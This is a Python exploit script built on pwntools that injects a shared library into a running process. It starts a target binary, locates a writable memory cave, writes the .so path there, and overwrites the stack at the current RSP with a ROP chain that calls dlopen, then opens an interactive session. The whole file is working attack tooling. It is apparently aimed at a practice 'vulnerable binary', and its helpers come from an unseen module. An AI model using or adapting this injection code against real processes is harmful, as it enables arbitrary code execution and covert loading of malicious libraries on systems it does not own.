#!/usr/bin/env python3
import argparse
from exploitutils import *
from pwn import *

context.arch = 'amd64'

class ProcessInjector:
    """
    Handles the process injection, including setting up the target process,
    constructing and writing the ROP chain, and interacting with the process.
    """

    def __init__(self, binary_path, so_path):
        self.binary_path = binary_path
        self.so_path = so_path
        self.target_process = None
        self.exploit_utils = None

    def start_target_process(self):
        """
        Start the target process and attach GDB for debugging.
        """
        self.target_process = process([self.binary_path])
        self.exploit_utils = ExploitUtils(self.target_process.pid)

    def inject_so(self):
        """
        Perform the injection of the shared object (.so) file using a crafted ROP chain.
        """
        # Retrieve current syscall information
        syscall_info = self.exploit_utils.parse_proc_syscall()
        log.info(f"Current RSP: {hex(syscall_info.rsp)}")

        # Find a memory cave for storing the SO path
        bss_cave = self.exploit_utils.find_cave(cave_size=0x100)

        # Create a ROP chain for calling dlopen with the shared object path
        dlopen_rop_chain = self.exploit_utils.dlopen_rop(address=bss_cave, so_path=self.so_path)

        # Write the SO path to the memory cave
        self.exploit_utils.write_memory(address=bss_cave, content=self.so_path.encode())

        # Write the ROP chain to the stack at the current RSP
        self.exploit_utils.write_memory(address=syscall_info.rsp, content=dlopen_rop_chain)

        self.target_process.sendline()
        self.target_process.interactive()


def parse_args():
    """
    Parse command-line arguments.
    """
    parser = argparse.ArgumentParser(description="[*] Process injection on a vulnerable binary.")
    parser.add_argument("binary", help="[*] Path to the vulnerable binary.")
    parser.add_argument("so", help="[*] Path to the shared object (.so) file.")
    return parser.parse_args()


def main():
    """
    Main function to orchestrate the process injection.
    """
    # Parse command-line arguments
    user_args = parse_args()

    # Initialize and start the injection process
    injector = ProcessInjector(user_args.binary, user_args.so)
    injector.start_target_process()
    injector.inject_so()


if __name__ == "__main__":
    main()
